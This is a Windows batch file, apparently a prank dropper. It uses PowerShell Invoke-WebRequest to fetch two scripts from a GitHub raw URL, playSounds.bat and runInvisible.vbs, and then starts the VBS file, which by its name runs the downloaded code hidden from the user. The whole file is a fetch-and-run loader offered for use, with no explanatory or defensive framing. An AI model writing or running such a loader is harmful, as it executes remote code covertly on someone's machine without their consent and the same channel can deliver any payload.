@ECHO OFF

powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/AAflip/XpNoisePrank/refs/heads/main/playSounds.bat' -OutFile playSounds.bat"
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/AAflip/XpNoisePrank/refs/heads/main/runInvisible.vbs' -OutFile runInvisible.vbs"
start runInvisible.vbs
exit